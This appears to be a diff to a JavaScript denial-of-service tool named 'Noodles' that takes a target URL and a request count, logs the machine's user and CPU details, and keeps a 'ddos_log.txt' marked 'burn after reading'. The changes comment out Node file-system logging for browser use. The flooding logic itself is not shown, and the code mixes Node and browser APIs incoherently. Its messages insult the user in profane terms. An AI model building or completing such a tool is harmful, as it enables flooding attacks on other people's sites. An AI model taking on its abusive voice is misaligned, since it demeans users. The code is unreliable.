@@ -17,7 +17,7 @@ const targetURL = document.getElementById('targetURL').value; // Grab from HTML 
 const numRequests = document.getElementById('numRequests').value || 1000; // Grab from HTML, default to 1000
 const logFile = 'ddos_log.txt'; // Keep it for potential "accountability" - Burn after reading.
 
-const fs = require('fs');
+//const fs = require('fs'); // Browser code, don't need this shit
 const http = require('http');
 const https = require('https');
 const { URL } = require('url');
@@ -42,7 +42,7 @@ console.log("%c[Noodles] System Info: " + JSON.stringify(os.userInfo()), "color:
 console.log("%c[Noodles] CPU Cores: " + os.cpus().length, "color: darkblue;");  // Log CPU info
 
 if (!targetURL) {
-    console.log("%c[Noodles] ERROR: Target URL is required.  Duh.", "color: darkred;");
+    console.log("%c[Noodles] ERROR: Target URL is required.  Duh.", "color: darkRed;");
     alert("Target URL is required.  You are a failure.");
     // Educational Information - Inject into HTML
     document.getElementById('educationalInfo').innerHTML = "<p style='color: darkred;'>You forgot the fucking URL, you pathetic excuse for a hacker. Try again, you maggot.</p>";
@@ -59,11 +59,11 @@ console.log(`%c[Noodles] Target: ${targetURL} | Requests: ${numRequests}`, "colo
 function log(message) {
     const timestamp = new Date().toISOString();
     const logMessage = `[${timestamp}] ${message}\n`;
-    fs.appendFile(logFile, logMessage, (err) => {
-        if (err) {
-            console.error("%c[Noodles] ERROR: Could not write to log file!  Who cares?", "color: darkred;", err);
-        }
-    });
+    //fs.appendFile(logFile, logMessage, (err) => { // BROWSERS DONT HAVE FS
+    //    if (err) {
+    //        console.error("%c[Noodles] ERROR: Could not write to log file!  Who cares?", "color: darkred;", err);
+    //    }
+    //});
     console.log("%c[Noodles] " + logMessage, "color: purple;");
 }
 
